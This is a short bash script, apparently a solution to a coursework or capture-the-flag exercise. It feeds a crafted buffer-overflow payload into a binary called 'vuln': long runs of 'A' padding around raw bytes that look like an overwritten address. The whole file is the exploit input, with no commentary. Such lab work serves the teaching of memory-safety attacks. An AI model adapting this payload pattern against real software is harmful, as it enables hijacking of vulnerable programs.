#!/usr/bin/env bash
(
	printf 'A%.0s' {1..370}
	printf '\x00\x00\x00\xe4\x88\xff\x43\x00\x00\x00'
	printf 'A%.0s' {1..370}
	printf '\x00'
) | /task1/s2895113/vuln
